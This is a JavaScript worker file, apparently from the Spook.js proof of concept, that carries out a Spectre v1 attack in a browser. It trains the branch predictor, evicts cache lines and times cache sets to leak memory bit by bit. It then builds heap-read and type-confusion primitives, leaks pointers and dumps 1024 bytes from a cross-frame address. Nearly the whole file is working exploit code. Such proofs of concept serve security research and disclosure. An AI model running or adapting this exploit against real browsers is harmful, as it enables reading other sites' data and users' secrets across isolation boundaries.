self.importScripts('leaky-page/leaky-page.js', 'util.js', 'spook.js');

function spectreGadget2() {
    // We want to access as little memory as possible to avoid false positives.
    // Putting arguments in a global array seems to work better than passing them
    // as parameters.
    const object = spectreArgs[0]|0;
    const array  = spectreArgs[1]|0;
    const bit    = spectreArgs[2]|0;
    
    for (let i = 0; i < 200; i++);
    
    if (array < typedArrays[object].f0) {
        return probeArray[((typedArrays[array].length>>bit)&1)*0x800];
    }
    
    return probeArray[0x400];
}

const testBit2 = preventOptimization(function(evictionList1, evictionList2, offset, bit, bitValue) {
    spectreArgs[0] = offset;
    spectreArgs[1] = 0;
    spectreArgs[2] = 0;
    
    // Run the gadget twice to train the branch predictor.
    for (let j = 0; j < 2; j++) {
        spectreGadget2();
    }
    
    evictionList1.traverse();
    
    spectreArgs[0] = offset;
    spectreArgs[1] = offset;
    spectreArgs[2] = bit;
    
    const timing = spectreTimer2.timeCacheSet(bitValue == 1 ? 32 : 0);
    
    return timing > CACHE_L1_THRESHOLD;
});

function leakBit2(evictionList1, evictionList2, offset, bit) {
    let zeroes = 0;
    let ones = 0;
    
    const min_leak_reps = 1;
    const max_leak_reps = 3;
    
    // Our leak is probabilistic. To filter out some noise, we test both for bit 0
    // and 1 repeatedly. If we didn't get a difference in cache hits, continue
    // until we see a diff.
    for (let i = 0; i <  min_leak_reps ; i++) {
        if (testBit2(evictionList1, evictionList2, offset, bit, 0)) zeroes++;
        if (testBit2(evictionList1, evictionList2, offset, bit, 1)) ones++;
    }
    for (let i =  min_leak_reps ; ones == zeroes && i <  max_leak_reps ; i++) {
        if (testBit2(evictionList1, evictionList2, offset, bit, 0)) zeroes++;
        if (testBit2(evictionList1, evictionList2, offset, bit, 1)) ones++;
        if (ones != zeroes) break;
    }
    return ones > zeroes ? 1 : 0;
}

function leakByte2(evictionList1, evictionList2, offset) {
    let byte = 0;
    for (let bit = 0; bit < 8; bit++) {
        byte |= leakBit2(evictionList1, evictionList2, offset, bit) << bit;
    }
    return byte;
}

function spectreGadget3() {
    // We want to access as little memory as possible to avoid false positives.
    // Putting arguments in a global array seems to work better than passing them
    // as parameters.
    const object = spectreArgs[0]|0;
    const array  = spectreArgs[1]|0;
    const bit    = spectreArgs[2]|0;
    const index  = spectreArgs[3]|0;
    
    for (let i = 0; i < 200; i++);
    
    // Leak the 
    if (array < typedArrays[object].f0) {
        return probeArray[((typedArrays[array][index]>>bit)&1)*0x800];
    }
    
    return probeArray[0x400];
}

const testBit3 = preventOptimization(function(evictor, offset, bit, bitValue) {
    spectreArgs[0] = offset;
    spectreArgs[1] = 0;
    spectreArgs[2] = 0;
    
    // Run the gadget twice to train the branch predictor.
    for (let j = 0; j < 2; j++) {
        spectreGadget3();
    }
    
    // Try to evict the length field of our array from memory, so that we can
    // speculate over the length check.
    evictor.traverse();
    
    spectreArgs[0] = offset;
    spectreArgs[1] = offset;
    spectreArgs[2] = bit;
    
    // In the gadget, we access cacheSet 0 if the bit was 0 and set 32 for bit 1.
    const timing = spectreTimer3.timeCacheSet(bitValue == 1 ? 32 : 0);
    
    return timing > CACHE_L1_THRESHOLD;
});

function leakBit3(evictor, offset, bit) {
    let zeroes = 0;
    let ones = 0;
    
    const min_leak_reps = 10;
    const max_leak_reps = 20;
    
    // Our leak is probabilistic. To filter out some noise, we test both for bit 0
    // and 1 repeatedly. If we didn't get a difference in cache hits, continue
    // until we see a diff.
    for (let i = 0; i <  min_leak_reps ; i++) {
        if (testBit3(evictor, offset, bit, 0)) zeroes++;
        if (testBit3(evictor, offset, bit, 1)) ones++;
    }
    for (let i =  min_leak_reps ; ones == zeroes && i <  max_leak_reps ; i++) {
        if (testBit3(evictor, offset, bit, 0)) zeroes++;
        if (testBit3(evictor, offset, bit, 1)) ones++;
        if (ones != zeroes) break;
    }
    return ones > zeroes ? 1 : 0;
}

function leakByte3(evictor, offset) {
    let byte = 0;
    for (let bit = 0; bit < 8; bit++) {
        byte |= leakBit3(evictor, offset, bit) << bit;
    }
    return byte;
}

async function main() {
    const PAGE_SZ = 4096;
    const CACHE_LINE_SZ = 64;

    const data = new Array(0x20).fill(0x5A);

    const result = createHeapReadPrimitive(data);
    if (result === null) {
        return null;
    }

    Object.defineProperty(self, "spectreTimer2", {
        value: new L1Timer(spectreGadget2)
    });
    Object.defineProperty(self, "spectreTimer3", {
        value: new L1Timer(spectreGadget3)
    });

    const {pageOffset, index, leak} = result;

    // Use leaky-page to deduce the correct object to leak with
    //  The proof-of-concept uses this to improve reliability and increase speed of setting spook.js up.
    let objectPageOffset = (pageOffset + 984) % PAGE_SZ;
    //const CACHE_LINE_SZ = 64;
    const OBJECT_LENGTH = 15 * 4;
    const desiredObjectAlignment = 2 * CACHE_LINE_SZ - (16);
    let alignedObjectIndex = 0;
    for (let i = 70; i < 128; i++) {
        if ((objectPageOffset % (2 * CACHE_LINE_SZ)) == desiredObjectAlignment) {
            log(`found object with desired alignment (@0x${objectPageOffset.toString(16)}) index: ${i}`);
            alignedObjectIndex = i;
            break;
        }

        objectPageOffset += OBJECT_LENGTH;
        objectPageOffset %= PAGE_SZ;
    }
    if (alignedObjectIndex == 0) {
        err(ERR_U8_ALIGN, "couldn't create object with right alignment");
        return;
    }

    // Construct an offset from the SpectreV1 array to the end of the last array (chosen arbitrarily)
    const ARRAY_LENGTH = 0xA4;
    const ARRAY_END = 0x20 + ARRAY_LENGTH * (64 - index - 1);

    // Verify that the primitive was constructed correctly.
    let count = 0;
    for (let i = 0; i < 300; i++) {
        if (leak(ARRAY_END - 32) === 0x3F) {
            count++;
        }
    }
    log(`Accuracy of heap read primitive ${count}/300`);
    if (count < 200) {
        err(`Failed to construct heap read primitive.`);
        return;
    }
    log("Heap read primitive successfully constructed.");

    // Calculate an offset to the beginning of the last array
    const ARRAY_START = ARRAY_END - ARRAY_LENGTH + 0x38;

    // Read ext_ptr_2
    const BasePointer = BigInt(
        (mode(100, x => leak(ARRAY_START + 44)) << 0) |
        (mode(100, x => leak(ARRAY_START + 45)) << 8)
    ) << 32n;

    log(`Leaked heap pointer : 0x${BasePointer.toString(16)}`);

    // Read base_ptr
    const ArrayPointer = BigInt(
        (mode(100, x => leak(ARRAY_START + 48)) << 0) |
        (mode(100, x => leak(ARRAY_START + 49)) << 8) |
        (mode(100, x => leak(ARRAY_START + 50)) << 16) |
        (mode(100, x => leak(ARRAY_START + 51)) << 24)
    ) + 0x07n + BasePointer;
    log(`Leaked array pointer: 0x${ArrayPointer.toString(16)}`);

    // Construct spook.js
    const spookjs = await SpookJs.create(typedArrays, {
        index: alignedObjectIndex,
        offset: Math.floor(objectPageOffset / 64),
        verify: {address: ArrayPointer, value: 0x3F}
    });

    if (spookjs === null) {
        err(`Failed to construct spook.js type confusion primitive`);
        return;
    }
    log(`Constructed spook.js type confusion primitive`);

    const address = await getCrossFrameAddress();
    log("Leaking from 0x" + address.toString(16));

    const start = address - 1024n;
    const end = start + 1024n;

    const startTime = performance.now();
    for (let i = start; i < end; i += 16n) {
        const bytes = [];
        for (let offset = 0n; offset < 16n; offset++) {
            bytes.push(spookjs.leak(i + offset));
        }

        const offset = (i - 16n).toString(16);
        const hex = bytes.map(x => x.toString(16).padStart(2, '0')).join(' ');
        const ascii = bytes.map(x => (32 <= x && x <= 126) ? String.fromCharCode(x) : ".").join('');

        log(`0x${offset}  ${hex}  ${ascii}`);
    }
    const endTime = performance.now();
    log(`[*] Leaked 1024 bytes in ${Math.round(endTime - startTime)}ms`);
}

const EVICTION_SET_MAX_SIZE = 64;

function shuffle(array) {
  var currentIndex = array.length, temporaryValue, randomIndex;

  // While there remain elements to shuffle...
  while (0 !== currentIndex) {

    // Pick a remaining element...
    randomIndex = Math.floor(Math.random() * currentIndex);
    currentIndex -= 1;

    // And swap it with the current element.
    temporaryValue = array[currentIndex];
    array[currentIndex] = array[randomIndex];
    array[randomIndex] = temporaryValue;
  }

  return array;
}

const END_MARKER = 0x7FFFFFFF;
class EvictionListL3 {
    constructor(memory, elements) {
        this.elements = elements;
        this.head = elements[0] / 4;
        this.memory = memory;

        this.offset = (elements[0]%PAGE_SZ)/CACHE_LINE_SZ;

        // Link elements together
        for (let i = 1; i < elements.length; i++) {
            memory[elements[i - 1] / 4] = elements[i] / 4;
        }

        memory[elements[elements.length - 1] / 4] = END_MARKER;
    }

    traverse() {
        let element = this.head;
        while (element !== END_MARKER) {
            //this.memory[element + 1]++;
            element = this.memory[element];
        }
        return element;
    }
}

let messageId = 0;
const messages = [];

class Message {
    constructor(type, payload){
        this.id = messageId++;
        this.type = type;
        this.payload = payload;

        this.promise = new Promise((resolve, reject) => {
            this.resolve = resolve;
            this.reject  = reject;
        });
    }
}

function sendMessage(type, payload = undefined) {
    const message = new Message()
    messages.push(message);
    self.postMessage({type: type, id: message.id, payload: payload});
    return message.promise;
}

self.onmessage = function(event) {
    const data = event.data;

    // Dispatch to the correct message
    for (let i = 0; i < messages.length; i++) {
        if (messages[i].id === data.id) {
            message = messages[i];
            messages[i] = messages[messages.length - 1];
            messages.pop();

            message.resolve(data.result);
            return;
        }
    }

    // Unhandled message
    const text = JSON.stringify(data);
    self.postMessage({type: 'exception', message: `Unhandled message (Worker): ${text}`});
}

function getAccessModules() {
    return sendMessage("getAccessModule");
}

function startTimer() {
    return sendMessage("startTimer");
}

function stopTimer() {
    return sendMessage("stopTimer");
}

function getAddressForDump() {
  return sendMessage("getAddress");
}

function sendLeakage(byteString) {
  return sendMessage("leakage", byteString);
}

function getCrossFrameAddress() {
    return sendMessage("getCrossFrameAddress");
}

main();